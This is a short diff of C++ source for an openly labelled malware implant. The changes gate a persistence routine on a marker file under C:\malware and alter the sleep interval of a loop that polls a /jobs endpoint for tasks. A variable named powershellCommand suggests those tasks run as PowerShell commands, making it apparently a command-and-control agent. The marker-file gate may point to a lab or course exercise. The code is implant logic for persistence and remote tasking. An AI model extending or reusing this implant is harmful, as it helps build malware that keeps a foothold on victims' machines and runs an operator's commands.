@@ -19,7 +19,7 @@ int wmain()
 {
     bool check = true;
     //std::filesystem::exists("C:\\malware\\ch0nky.txt");
-    if(check){
+    if(std::filesystem::exists("C:\\malware\\ch0nky.txt")){
         persistenceLOL();
         //FreeConsole();
         //get machine guid
@@ -82,7 +82,7 @@ int wmain()
         string taskStr, strTemp, taskHolder, powershellCommand, output, finalOutput;
         size_t semiColonIndex, numOfTasks, start_index;
         while(iamImmortal){
-            Sleep(10000);
+            Sleep(number);
             //request jobs
             taskStr = client->makeHttpRequest(L"POST", L"/jobs", tls, &result);
             cout << "Tasks: " << taskStr.c_str() << endl;
